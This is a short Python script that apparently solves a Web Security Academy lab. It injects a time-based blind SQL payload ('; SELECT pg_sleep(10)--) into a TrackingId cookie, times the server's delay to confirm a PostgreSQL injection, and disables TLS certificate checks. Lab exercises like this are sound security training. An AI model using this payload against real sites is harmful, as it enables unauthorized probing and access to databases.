import http.client
import re
import ssl
import time
import urllib

LAB_ID = "???"


def GET_(
        tracking_id: str | None = None,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    if tracking_id:
        headers['cookie'] = f'TrackingId={urllib.parse.quote_plus(tracking_id)}'
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def tracking_id() -> str:
    response = GET_()
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'TrackingId=([a-zA-Z0-9]+);', cookie_header)[0]


response = GET_()
if response.status != 200:
    raise Exception
tracking_cookie = tracking_id()
start = time.time()
response = GET_(
    f"""{tracking_cookie}'; SELECT pg_sleep(10)--""")
if response.status != 200:
    raise Exception
print(f"got response after: {int(time.time() - start)} seconds")
